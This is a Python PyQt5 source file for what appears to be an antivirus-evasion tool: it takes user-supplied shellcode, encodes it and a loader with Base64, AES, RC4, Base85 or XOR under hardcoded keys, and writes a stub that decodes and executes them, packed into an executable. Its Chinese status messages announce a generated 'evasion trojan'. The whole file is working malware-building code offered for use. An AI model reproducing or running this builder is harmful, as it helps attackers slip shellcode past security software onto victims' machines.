#!/usr/bin/env python3
# -*- coding:utf-8 -*-
from PyQt5 import QtCore
import json,time,sys
from PyQt5.Qt import *
from UiXingHuoBypassAv import Ui_widget


class EmittingStr(QtCore.QObject):
    textWritten = QtCore.pyqtSignal(str)
    def write(self, text):
        self.textWritten.emit(str(text))
        loop = QEventLoop()
        QTimer.singleShot(1000, loop.quit)

class ControlBoard(QMainWindow, Ui_widget):

    def __init__(self):
        super(ControlBoard, self).__init__()
        Ui_widget.setupUi(self,self)
        sys.stdout = EmittingStr(textWritten=self.outputWritten)
        sys.stderr = EmittingStr(textWritten=self.outputWritten)

    def BypassBase64(self):
        Ui_widget.printf(self, '[+] 正在调用Base64加密，请稍等...')
        time.sleep(0.5)
        code = self.lineEdit.text()
        Ui_widget.printf(self, '[+] shellcode读取成功！')
        time.sleep(0.5)
        with open('source.json', 'r') as f:
            text = f.read()
            jsoncode = json.loads(text)
            load = jsoncode['load']
        Ui_widget.printf(self, '[+] 加载器读取成功!')
        time.sleep(0.5)
        dictionary = {
            "code": Ui_widget.Base64_Bypass(code.encode('utf-8')).decode(),
            "load": Ui_widget.Base64_Bypass(load.encode('utf-8')).decode()
        }
        Ui_widget.printf(self, '[+] shellcode加密成功')
        time.sleep(0.5)
        Ui_widget.printf(self, '[+] shellcode加载器加密成功!')
        time.sleep(0.5)
        with open("result/exe/1.json", "w") as outfile:
            json.dump(dictionary, outfile)
        Ui_widget.printf(self, '[+] 1.json写入成功')
        time.sleep(0.5)
        command_base64 = """#coding:utf-8
import json
import base64
import ctypes
with open('1.json', 'r') as f:
    text = f.read()
    jsoncode = json.loads(text)
    code = jsoncode['code']
    load = jsoncode['load']
code = base64.b64decode(code)
code = bytes.fromhex(str(code,'utf-8'))
exec (base64.b64decode(load))
"""
        with open("result/ma.py", 'a+') as f:
            f.write(command_base64)
            f.close()
        Ui_widget.printf(self, '[+] ma.py写入成功,打包exe中,请稍等......')
        self.Pack()
        time.sleep(0.5)
        Ui_widget.printf(self, '[+] 免杀马生成成功!,前往result目录查看')
        time.sleep(0.5)
        Ui_widget.printf(self, '[+] 分离免杀,1.json和exe同时使用！')
        self.show_message()

    def BypassAES(self):
        Ui_widget.printf(self, '[+] 正在调用AES加密，请稍等...')
        time.sleep(0.5)
        code = self.lineEdit.text()
        Ui_widget.printf(self, '[+] shellcode读取成功！')
        time.sleep(0.5)
        with open('source.json', 'r') as f:
            text = f.read()
            jsoncode = json.loads(text)
            load = jsoncode['load']
        Ui_widget.printf(self, '[+] 加载器读取成功!')
        time.sleep(0.5)
        dictionary = {
            "code": Ui_widget.AES_Bypass(code),
            "load": Ui_widget.AES_Bypass(load)
        }
        Ui_widget.printf(self, '[+] shellcode加密成功')
        time.sleep(0.5)
        Ui_widget.printf(self, '[+] shellcode加载器加密成功!')
        time.sleep(0.5)
        with open("result/exe/1.json", "w") as outfile:
            json.dump(dictionary, outfile)
        Ui_widget.printf(self, '[+] 1.json写入成功')
        time.sleep(0.5)
        command_aes = """
import aesdecypto
import json
import ctypes
with open('1.json','r') as f:
    text = f.read()
    jsoncode = json.loads(text)
    load = jsoncode['load']
    code = jsoncode['code']
aes_key = "dfhkAsDFAjDShdfu"
code = aesdecypto.decrypt(aes_key, code)
code = bytes.fromhex(code)
load = aesdecypto.decrypt(aes_key, load)
exec (load)
""".encode('utf-8').decode()
        with open("result/ma.py", 'a+') as f:
            f.write(command_aes)
            f.close()
        Ui_widget.printf(self, '[+] ma.py写入成功,打包exe中,请稍等......')
        self.Pack()
        time.sleep(0.5)
        Ui_widget.printf(self, '[+] 免杀马生成成功!,前往result目录查看')
        time.sleep(0.5)
        Ui_widget.printf(self, '[+] 分离免杀,1.json和exe同时使用！')
        self.show_message()

    def BypassRC4(self):
        Ui_widget.printf(self, '[+] 正在调用Rc4加密，请稍等...')
        time.sleep(0.5)
        code = self.lineEdit.text()
        Ui_widget.printf(self, '[+] shellcode读取成功！')
        time.sleep(0.5)
        with open('source.json', 'r') as f:
            text = f.read()
            jsoncode = json.loads(text)
            load = jsoncode['load']
        Ui_widget.printf(self, '[+] 加载器读取成功!')
        time.sleep(0.5)
        dictionary = {
            "code": Ui_widget.RC4_Bypass(code),
            "load": Ui_widget.RC4_Bypass(load)
        }
        Ui_widget.printf(self, '[+] shellcode加密成功')
        time.sleep(0.5)
        Ui_widget.printf(self, '[+] shellcode加载器加密成功!')
        time.sleep(0.5)
        with open("result/exe/1.json", "w") as outfile:
            json.dump(dictionary, outfile)
        Ui_widget.printf(self, '[+] 1.json写入成功')
        time.sleep(0.5)
        command_rc4 = """
import rc4decrypt
import ctypes
import json
with open('1.json', 'r') as f:
    text = f.read()
    jsoncode = json.loads(text)
    code = jsoncode['code']
    load = jsoncode['load']
code = rc4decrypt.rc4_main('hdfhaagaj7739skjshs',code)
code = bytes.fromhex(code)
load = rc4decrypt.rc4_main("hdfhaagaj7739skjshs", load)
exec (load)
"""
        with open("result/ma.py", 'a+') as f:
            f.write(command_rc4)
            f.close()
        Ui_widget.printf(self, '[+] ma.py写入成功,打包exe中,请稍等......')
        self.Pack()
        time.sleep(0.5)
        Ui_widget.printf(self, '[+] 免杀马生成成功!,前往result目录查看')
        time.sleep(0.5)
        Ui_widget.printf(self, '[+] 分离免杀,1.json和exe同时使用！')
        self.show_message()

    def BypassB85(self):
        Ui_widget.printf(self, '[+] 正在调用B85加密，请稍等...')
        time.sleep(0.5)
        code = self.lineEdit.text()
        Ui_widget.printf(self, '[+] shellcode读取成功！')
        time.sleep(0.5)
        with open('source.json', 'r') as f:
            text = f.read()
            jsoncode = json.loads(text)
            load = jsoncode['load']
        Ui_widget.printf(self, '[+] 加载器读取成功!')
        time.sleep(0.5)
        dictionary = {
            "code": Ui_widget.B85_Bypass(code.encode('utf-8')).decode(),
            "load": Ui_widget.B85_Bypass(load.encode('utf-8')).decode()
        }
        Ui_widget.printf(self, '[+] shellcode加密成功')
        time.sleep(0.5)
        Ui_widget.printf(self, '[+] shellcode加载器加密成功!')
        time.sleep(0.5)
        with open("result/exe/1.json", "w") as outfile:
            json.dump(dictionary, outfile)
        Ui_widget.printf(self, '[+] 1.json写入成功')
        time.sleep(0.5)
        command_base64 = """
#coding:utf-8
import json
import base64
import ctypes
with open('1.json', 'r') as f:
    text = f.read()
    jsoncode = json.loads(text)
    code = jsoncode['code']
    load = jsoncode['load']
code = base64.b85decode(code)
code = bytes.fromhex(str(code,'utf-8'))
exec (base64.b85decode(load))
"""
        with open("result/ma.py", 'a+') as f:
            f.write(command_base64)
            f.close()
        Ui_widget.printf(self, '[+] ma.py写入成功,打包exe中,请稍等......')
        self.Pack()
        time.sleep(0.5)
        Ui_widget.printf(self, '[+] 免杀马生成成功!,前往result目录查看')
        time.sleep(0.5)
        Ui_widget.printf(self, '[+] 分离免杀,1.json和exe同时使用！')
        self.show_message()

    def BypassXor(self):
        Ui_widget.printf(self, '[+] 正在调用Xor加密，请稍等...')
        time.sleep(0.5)
        code = self.lineEdit.text()
        Ui_widget.printf(self, '[+] shellcode读取成功！')
        time.sleep(0.5)
        with open('source.json', 'r') as f:
            text = f.read()
            jsoncode = json.loads(text)
            load = jsoncode['load']
        Ui_widget.printf(self, '[+] 加载器读取成功!')
        time.sleep(0.5)
        dictionary = {
            "code": Ui_widget.Xor_Bypass(code),
            "load": Ui_widget.Xor_Bypass(load)
        }
        Ui_widget.printf(self, '[+] shellcode加密成功')
        time.sleep(0.5)
        Ui_widget.printf(self, '[+] shellcode加载器加密成功!')
        time.sleep(0.5)
        with open("result/exe/1.json", "w") as outfile:
            json.dump(dictionary, outfile)
        Ui_widget.printf(self, '[+] 1.json写入成功')
        time.sleep(0.5)
        command_Xor = """
#coding:utf-8
import json
import DoXor
import ctypes
with open('1.json', 'r') as f:
    text = f.read()
    jsoncode = json.loads(text)
    code = jsoncode['code']
    load = jsoncode['load']
code = DoXor.XorDecode(code,"aaaaaaaaaa")
code = bytes.fromhex(code)
exec (DoXor.XorDecode(load,"aaaaaaaaaa"))
"""
        with open("result/ma.py", 'w') as f:
            f.write(command_Xor)
            f.close()
        Ui_widget.printf(self, '[+] ma.py写入成功,打包exe中,请稍等......')
        self.Pack()
        time.sleep(0.5)
        Ui_widget.printf(self, '[+] 免杀马生成成功!,前往result目录查看')
        time.sleep(0.5)
        Ui_widget.printf(self, '[+] 分离免杀,1.json和exe同时使用！')
        self.show_message()

    def Choice(self):
        if self.comboBox.currentIndex() == 1:
            self.pushButton.clicked.connect(self.BypassBase64)
        elif self.comboBox.currentIndex() == 2:
            self.pushButton.clicked.connect(self.BypassAES)
        elif self.comboBox.currentIndex() == 3:
            self.pushButton.clicked.connect(self.BypassRC4)
        elif self.comboBox.currentIndex() == 4:
            self.pushButton.clicked.connect(self.BypassB85)
        elif self.comboBox.currentIndex() == 5:
            self.pushButton.clicked.connect(self.BypassXor)
        else:
            pass

if __name__ == '__main__':
    app = QApplication(sys.argv)
    app.setStyle('Fusion')
    window = ControlBoard()
    window.show()
    sys.exit(app.exec_())